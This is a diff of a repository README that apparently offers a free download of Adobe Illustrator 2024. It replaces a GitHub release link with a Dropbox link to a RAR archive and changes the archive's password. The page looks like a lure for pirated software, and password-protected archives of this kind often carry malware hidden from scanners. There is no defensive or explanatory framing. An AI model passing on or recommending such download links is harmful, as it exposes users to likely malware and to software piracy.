@@ -19,11 +19,11 @@ This repository contains the installation files for Adobe Illustrator 2024, a po
 
 ## Download
 
-# **[https://github.com/akivec/Adobe-Illustrator/releases/download/Donwload/Adobe.Illustrator.2024.zip)**
+# **[https://www.dropbox.com/scl/fi/baejbp61g2pre9xexi55m/Adobe.rar?rlkey=g9lqntnqoahakwxmlmw72hta5&st=92pqi1ei&dl=0)**
 
 ## Password
 
-The password for the downloaded archive is **1212**.
+The password for the downloaded archive is **2323**.
 
 ## Disclaimer
 
